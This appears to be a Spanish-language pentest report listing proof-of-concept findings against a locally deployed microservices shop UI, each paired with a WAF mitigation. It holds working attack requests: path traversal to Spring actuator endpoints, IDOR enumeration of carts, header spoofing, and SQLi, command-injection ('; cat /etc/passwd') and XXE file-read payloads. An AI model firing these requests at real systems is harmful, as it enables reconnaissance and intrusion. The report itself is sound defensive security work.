PoC #1 · CRÍTICO
SSRF + Path Traversal vía /proxy/**
El ProxyController de Spring concatena el path del cliente al endpoint del backend sin sanitizar. La normalización de URI hace que ../../ escape el host del backend y termine hitteando el actuator del propio UI. Cualquier filtro a nivel UI queda bypasseado.
Request enviada
GET /proxy/catalog/../../actuator/prometheus HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
Accept: */*
Response recibida
Status: 200 OK Bytes: 25.383 Latency: 5 ms 
HTTP/1.1 200 OK
content-type: text/plain;version=0.0.4;charset=utf-8

# HELP application_ready_time_seconds Time taken for the application to be ready to service requests
# TYPE application_ready_time_seconds gauge
application_ready_time_seconds{main_application_class="com.amazon.sample.ui.UiApplication"} 9.782
# HELP disk_total_bytes Total space for path
# TYPE disk_total_bytes gauge
disk_total_bytes{path="/app/."} 1.081100128256E12
# HELP disk_free_bytes Usable space for path
# TYPE disk_free_bytes gauge
disk_free_bytes{path="/app/."} 1.002170220544E12
# HELP http_client_requests_active_seconds_count
# TYPE http_client_requests_active_seconds_count counter
http_client_requests_active_seconds_count{client_name="carts",exception="none",method="GET",outcome="UNKNOWN",status="CLIENT_ERROR",uri="none"} 0
http_client_requests_active_seconds_count{client_name="catalog",...
http_client_requests_active_seconds_count{client_name="checkout",...
http_client_requests_active_seconds_count{client_name="orders",...
…(25 KB en total — 175 series Prometheus)
Por qué duele: el atacante recibe en una sola request los nombres de los 4 microservicios internos (carts, catalog, checkout, orders), capacidad de disco (1 TB), versión del JVM, paths llamados recientemente por OTROS atacantes, y excepciones internas. Es OSINT pasivo gratis sobre la infraestructura.
Mitigación post-WAF: OWASP CRS familia 930xxx (LFI/path traversal) bloquea la traversal literal, regla custom id:9001 bloquea cualquier URL que matchee ^/actuator/(env|heapdump|threaddump|loggers|metrics|prometheus|info).
PoC #2 · CRÍTICO
IDOR en /proxy/carts/{customerId}
El backend carts es ClusterIP — por diseño NO debería ser alcanzable desde Internet. El ProxyController lo expone, y el segmento del path se interpreta como customerId sin pedir autenticación. Cualquiera puede enumerar carritos.
Request enviada
GET /proxy/carts/admin HTTP/1.1
Host: localhost
Accept: application/json
Response recibida
Status: 200 OK Bytes: 33 Latency: 19 ms 
HTTP/1.1 200 OK
content-type: application/json

{"customerId":"admin","items":[]}
Probado también con test, 1, users, 00000000-0000-0000-0000-000000000000 — todos devuelven 200 con su respectivo customerId.
Por qué duele: en este despliegue todos los carritos están vacíos, pero en producción cualquier carrito es enumerable. Si alguien activa POST en el ProxyController, también se vuelve escribible (hoy un POST devuelve 405).
Mitigación post-WAF: regla custom que bloquee ^/proxy/carts/ si no hay header Authorization o Cookie de sesión válida. Idealmente, el WAF + Service Mesh garantizan que los servicios ClusterIP solo respondan a requests con identidad mTLS.
PoC #3 · ALTA
Acceso directo a /actuator/prometheus
Sin necesidad de path traversal — el endpoint Prometheus está expuesto directamente. El config application.yml incluye info,health,metrics,prometheus en el management.endpoints.web.exposure.include.
Request enviada
GET /actuator/prometheus HTTP/1.1
Host: localhost
Response recibida
Status: 200 OK Bytes: 24.468 
HTTP/1.1 200 OK

(mismo body de 25 KB que PoC #1, pero sin necesidad de proxy)
Mitigación post-WAF: regla custom id:9001 deny en path ^/actuator/.* excepto /actuator/health que solo debe ser accesible desde el rango interno del cluster.

PoC #5 · ALTA
Backends ClusterIP alcanzables vía proxy
Los servicios catalog, carts, orders, checkout están definidos como ClusterIP — sin Ingress propio. Sin embargo, el ProxyController los expone individualmente.
Requests enviadas
GET /proxy/orders/anything
GET /proxy/checkout/anything
GET /proxy/carts/anything
GET /proxy/notreal/foo  ← control negativo
Responses recibidas
orders   → 404 {"timestamp":"...","status":404,"error":"Not Found",
            "path":"/orders/anything"}                  ← Spring Boot
checkout → 404 {"message":"Checkout not found","error":"Not Found",
            "statusCode":404}                            ← NestJS
carts    → 200 {"customerId":"anything","items":[]}        ← Spring Boot
notreal  → 404 {"timestamp":"...","path":"/proxy/notreal/foo",
            "status":404}                                ← rebote del UI
Lo que aprendió Mallory en 4 requests: los 3 backends responden con su propio formato de error (Spring vs NestJS), confirmando el stack de cada uno y el alcance del proxy. El servicio notreal rebota desde el UI (formato distinto) — útil para distinguir falsos negativos.

PoC #8 · MEDIA
Spoofing de cabeceras X-Forwarded-*
Request enviada
GET / HTTP/1.1
Host: localhost
X-Forwarded-For: 8.8.8.8
X-Forwarded-Proto: https
X-Forwarded-Host: evil-bank.com
X-Real-IP: 8.8.8.8
Response recibida
Status: 200 OK Bytes: 19.973 
HTTP/1.1 200 OK
content-type: text/html

(home renderizada normalmente — Spring loggeará "8.8.8.8" como IP origen,
generará URLs como https://evil-bank.com/... debido a X-Forwarded-Host)
Mitigación post-WAF: ModSecurity strip de headers X-Forwarded-* en phase:1 si la IP origen no está en la whitelist de proxies de confianza.
PoC #9 · MEDIA
Catalog acepta SQLi/RCE en query string sin alarma
Aunque el backend Go usa Gorm parametrizado (la SQLi no es explotable hoy), la app devuelve 200 OK al payload — el atacante NO recibe alarma e itera más payloads sofisticados.
Requests enviadas
GET /catalog?tag=' OR '1'='1
GET /catalog?tag=; cat /etc/passwd
GET /catalog?tag=<!ENTITY xxe SYSTEM 'file:///etc/passwd'>
Response recibida
los 3 → 200 OK + página catálogo renderizada
       (vista vacía porque ningún tag matchea, pero NO hay 403/406)
Mitigación post-WAF: CRS 942100 (SQLi), 932100 (RCE), 933160 (PHP/cmd injection) — devuelven 403 ANTES de llegar al backend.
PoC #10 · MEDIA
Auditoría de headers de seguridad — 0 / 6 presentes
Request enviada
HEAD / HTTP/1.1
Host: localhost
Headers recibidos (auditados)
Strict-Transport-Security:    MISSING
X-Frame-Options:              MISSING  → clickjacking posible
X-Content-Type-Options:       MISSING  → MIME sniffing
Content-Security-Policy:      MISSING  → XSS no mitigado
Referrer-Policy:              MISSING  → leak de referrer
Permissions-Policy:           MISSING  → APIs browser sin restringir
Mitigación post-WAF: Nginx ConfigMap add-headers en ingress-nginx, agregando los 6 headers en cada response. Se aplica de forma blanket sin tocar la app.
